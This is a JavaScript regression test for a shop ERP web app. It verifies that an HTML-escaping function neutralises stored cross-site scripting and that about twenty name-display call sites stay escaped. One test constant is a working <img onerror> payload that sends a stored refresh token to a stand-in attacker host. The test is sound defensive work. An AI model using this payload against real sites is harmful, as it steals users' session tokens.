/**
 * XSS regression test for S-1 (SecurityHardeningReview.md) and S-2.
 *
 * S-1: confirmed cross-tenant stored XSS via `u.name` in pssLicenseVerify()
 * — a shop's display name, echoed unescaped into another user's session on
 * the license-verify screen.
 *
 * S-2: the same unescaped-name-into-toast() pattern at ~19 additional call
 * sites (product/customer/staff/shop names, expense category names) feeding
 * toast()'s innerHTML sink.
 *
 * Two layers, no DOM dependency (no jsdom in this project — see
 * OperationalReadinessPlan.md's no-new-dependency posture):
 *   1. Functional: extract the real escHtml() implementation from the HTML
 *      source and run it against actual XSS payloads, confirming the
 *      dangerous characters never survive into what would become innerHTML.
 *   2. Static regression guard: confirm every previously-vulnerable call
 *      site now wraps its user-controlled variable in escHtml()/esc() — so
 *      a future edit that silently drops the wrapper fails this test.
 *
 * Layer 2 matches by unique source snippet, not by hardcoded line number.
 * An earlier version of this test anchored each check to a fixed line
 * number and broke (all 22 Layer-2 assertions failed, none of them a real
 * regression — every escHtml() wrapper was still correctly in place) the
 * moment an unrelated change added ~90 lines earlier in the file — a
 * lesson in why line numbers are the wrong anchor for a ~16,000-line file
 * that changes for reasons unrelated to security. Each site below is
 * identified by a snippet unique enough to survive reformatting; the
 * actual matched line is resolved and reported for readability, not
 * asserted against.
 */
'use strict';

const fs = require('fs');
const path = require('path');

let passed = 0, failed = 0;
function assert(cond, label) {
  if (cond) { passed++; console.log('  \x1b[32m✓\x1b[0m ' + label); }
  else { failed++; console.log('  \x1b[31m✗ FAIL\x1b[0m ' + label); }
}

const htmlPath = path.join(__dirname, '..', '..', 'app', 'ShopERP_Pro_v8.html');
const src = fs.readFileSync(htmlPath, 'utf8');

// ---------------------------------------------------------------------
// Layer 1: escHtml() actually neutralizes real XSS payloads
// ---------------------------------------------------------------------
const escHtmlMatch = src.match(/function escHtml\(s\)\{[^}]*\}/);
assert(!!escHtmlMatch, 'escHtml() function definition found in source');

// eslint-disable-next-line no-eval
const escHtml = eval('(' + escHtmlMatch[0].replace('function escHtml', 'function') + ')');

const S1_PAYLOAD = '<img src=x onerror="fetch(\'//attacker.example/x?t=\'+localStorage.getItem(\'shoperpro_refresh\'))">';
const escapedS1 = escHtml(S1_PAYLOAD);
assert(!escapedS1.includes('<img'), 'escHtml() neutralizes a live <img onerror> payload (no raw <img tag survives)');
assert(!escapedS1.includes('<'), 'escHtml() output contains no raw "<" character');
assert(!escapedS1.includes('>'), 'escHtml() output contains no raw ">" character');
assert(escapedS1.includes('&lt;img'), 'escHtml() correctly entity-encodes the payload (&lt;img present)');

// Reproduce the exact S-1 sink construction with escHtml applied, and confirm
// the resulting string — the literal value that would be assigned to
// innerHTML — contains no executable markup.
const initials = '<S';
const roleLabel = 'Owner';
const reconstructedInnerHTML =
  '<div class="pss-user-avatar">' + escHtml(initials) + '</div><div><div class="pss-user-info-name">' +
  escHtml(S1_PAYLOAD) + '</div><div class="pss-user-info-role">' + roleLabel + '</div></div>';
assert(!/<img[^>]*onerror/i.test(reconstructedInnerHTML), 'S-1: reconstructed innerHTML for pss-user-info-name contains no live onerror handler — cross-tenant exploitation via this vector is no longer possible');

// ---------------------------------------------------------------------
// Layer 2: static regression guard — every known-vulnerable call site
// must still wrap its user-controlled field in escHtml()/esc(). Matched
// by unique snippet, not line number (see file header).
// ---------------------------------------------------------------------
function findLine(snippet) {
  const idx = src.indexOf(snippet);
  if (idx === -1) return null;
  return src.slice(0, idx).split('\n').length;
}
function assertSnippet(snippet, label) {
  const line = findLine(snippet);
  assert(line !== null, `${label} (found at line ${line}): wraps its user-controlled field in escHtml()`);
}

// S-1
assertSnippet(
  "escHtml(initials)+'</div><div><div class=\"pss-user-info-name\">'+escHtml(u.name)",
  'S-1: pssLicenseVerify() u.name and initials both wrapped in escHtml()'
);

// S-2 — all 19 confirmed toast()/construction sites, one exact snippet each
const s2Snippets = [
  ["toast('PIN set for '+escHtml(u.name),'success')", 'PIN set toast'],
  ["toast('PIN updated for '+escHtml(u.name),'success')", 'PIN updated toast'],
  ["toast('Existing customer selected: '+escHtml(dup.name),'info')", 'existing customer selected toast'],
  ["fieldErr('p-imei','IMEI already registered to \"'+dup.name+'\"');toast('Duplicate IMEI - already linked to \"'+escHtml(dup.name)", 'duplicate IMEI toast (add)'],
  ["fieldErr('ep-imei','IMEI already registered to \"'+dup.name+'\"');toast('Duplicate IMEI - already linked to \"'+escHtml(dup.name)", 'duplicate IMEI toast (edit)'],
  ["toast(`Only ${availableStock} unit${availableStock!==1?'s':''} of \"${escHtml(prod.name)}\" in stock`,'error')", 'stock-limit toast (cart)'],
  ["toast(`Only ${maxStock} unit${maxStock!==1?'s':''} of \"${escHtml(item.name)}\" in stock`,'error')", 'stock-limit toast (qty change)'],
  ["toast('Insufficient stock for '+escHtml(prod.name),'error')", 'insufficient stock toast (warranty part)'],
  ["toast(`${escHtml(p.name)} is out of stock`,'error')", 'out of stock toast'],
  ["toast(`Only ${prod.stock} unit${prod.stock!==1?'s':''} of \"${escHtml(prod.name)}\" in stock`,'error')", 'stock-limit toast (repair part)'],
  ["toast(escHtml(name)+' added as '+role+'. Set their PIN now.','success')", 'staff added toast'],
  ["toast((isRenew?'Renewed ':'Key generated for ')+escHtml(shopName),'success')", 'admin key generated toast'],
  ["toast('Account paused for '+escHtml(c.shopName),'info')", 'admin account paused toast'],
  ["toast('Account terminated for '+escHtml(c.shopName),'error')", 'admin account terminated toast'],
  ["toast('Account restored for '+escHtml(c.shopName),'success')", 'admin account restored toast'],
  ["toast('Server updated: '+escHtml(shopName)+' is now '+status,'success')", 'admin server-status-updated toast'],
  ["toast('PIN reset for '+escHtml(userName),'success')", 'admin PIN reset toast'],
  ['stockErrors.push(`"${escHtml(item.name)}": selling ${item.qty} but only ${prod.stock} in stock`)', 'stock-insufficient error list construction'],
  ["toast('Category \"'+escHtml(n)+'\" added','success')", 'expense category added toast'],
];

for (const [snippet, label] of s2Snippets) {
  assertSnippet(snippet, `S-2: ${label}`);
}

// Negative control: confirm native window.confirm() call sites for names
// were deliberately NOT changed — confirm() is a native dialog (plain text,
// not an innerHTML sink), so wrapping it would be a no-op at best and would
// incorrectly display literal "&#39;" etc. for names containing quotes/
// apostrophes at worst. This guards against a future "helpful" but wrong fix.
const negativeControls = [
  ["confirm('Clear PIN for '+u.name+'?", 'confirm() for PIN clear'],
  ["confirm('⚠️ Phone '+phone+' already exists for \"'+dup.name+'\"", 'confirm() for duplicate phone'],
];
for (const [snippet, label] of negativeControls) {
  const line = findLine(snippet);
  assert(line !== null, `S-2 negative control: ${label} (found at line ${line}) is correctly left unescaped — native dialog, not an innerHTML sink`);
}

console.log('\n' + passed + ' passed, ' + failed + ' failed');
process.exit(failed > 0 ? 1 : 0);
